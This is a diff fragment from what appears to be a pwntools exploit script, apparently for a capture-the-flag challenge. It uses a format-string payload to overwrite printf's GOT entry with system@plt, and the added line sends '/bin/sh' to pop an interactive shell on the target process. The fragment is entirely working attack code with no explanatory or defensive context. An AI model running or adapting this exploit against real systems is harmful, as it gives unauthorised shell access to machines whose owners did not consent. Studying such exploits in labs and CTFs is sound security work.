@@ -44,8 +44,8 @@ log.info("system@plt = 0x{:08x}".format(system_plt))
 f = FormatStr(isx64=1)# for x86_64
 f[printf_got] = system_plt
 f[printf_got + 4] = 0
-
 p.recvuntil("$ ")
 p.sendline(f.payload(12))
+p.sendline("/bin/sh")
 
 p.interactive()
